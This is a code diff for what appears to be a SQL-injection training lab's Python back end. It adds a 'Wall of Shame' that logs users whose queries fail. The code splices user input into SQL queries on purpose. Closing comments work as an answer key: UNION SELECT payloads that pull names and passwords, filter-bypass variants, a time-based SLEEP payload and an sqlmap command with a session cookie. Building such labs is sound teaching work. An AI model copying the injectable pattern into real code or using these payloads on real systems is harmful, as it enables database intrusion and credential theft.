@@ -1,6 +1,7 @@
 import json
 import mysql.connector
 import re
+from util import *
 
 # From config load filter + sql query and then return results to user
 
@@ -32,7 +33,7 @@ def sqlquery(labnum, query):
     
     try: myresult
     except: 
-        return "SQL Error!"
+        return "Error! Added to Wall of Shame. Thanks"
     
     if len(myresult) == 0:
         return "No results"
@@ -40,7 +41,7 @@ def sqlquery(labnum, query):
         #print("Returning {}".format(myresult))
         return myresult
 
-def processrequest(labnum, value):
+def processrequest(labnum, value, user):
     if labnum in data['labs'][0] and len(value) > 0:
         f = data['labs'][0][labnum]['Filter']
         cleanvalue = re.sub(f, '', value)
@@ -48,6 +49,8 @@ def processrequest(labnum, value):
         query = query.replace('USERINPUTHERE', cleanvalue)
         print("Query : {0} Lab : {1}".format(query, labnum))
         out = sqlquery(labnum, query)
+        if out == "Error! Added to Wall of Shame. Thanks":
+            addtowallofshame(user, query)
         #print("Query : {}".format(query))
         return out
     else:
@@ -65,3 +68,7 @@ def checkanswer(labnum, answer):
 # 1) 1 UNION SELECT Name, Password FROM secret
 # 2) 1' UNION SELECT Name, Password FROM secret -- -
 # 3) 1/**/UNION/**/SELECT/**/Name,/**/Password/**/FROM/**/secret
+# 4) 1 UNIOn SELECT Name, Password FROM secret
+# 5) Time based 
+#    Payload: value=1 AND (SELECT 1747 FROM (SELECT(SLEEP(5)))qZWz)&lab=4
+#    sqlmap -u "http://10.24.0.137/lab4/" --data "value=1&lab=4" --cookie="sqlilab=phxwfwspqs"
